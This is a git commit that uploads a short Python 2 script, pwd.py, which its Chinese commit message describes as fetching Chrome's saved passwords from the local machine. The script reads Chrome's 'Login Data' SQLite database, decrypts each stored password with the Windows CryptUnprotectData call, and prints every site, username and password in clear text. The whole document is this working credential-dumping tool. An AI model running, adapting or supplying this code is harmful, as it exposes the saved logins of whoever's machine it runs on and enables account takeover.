ca31ebabce624549bb91801a9fbe3e15c755f20f
emmamao <731305023@qq.com>
2018-04-09 15:40:56 +0800

    Add files via upload
    chrome保存密码本地获取

---
+++ pwd.py
@@ -0,0 +1,20 @@
+from os import getenv
+import sqlite3
+import win32crypt
+ 
+# Connect to the Database
+#conn = sqlite3.connect(getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data")
+conn = sqlite3.connect("Login Data")
+cursor = conn.cursor()
+# Get the results
+cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+for result in cursor.fetchall():
+    print result
+# Decrypt the Password
+    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
+    if password:
+        print 'Site: ' + result[0]
+        print 'Username: ' + result[1]
+        print 'Password: ' + password
+    else:
+        print "no password found"
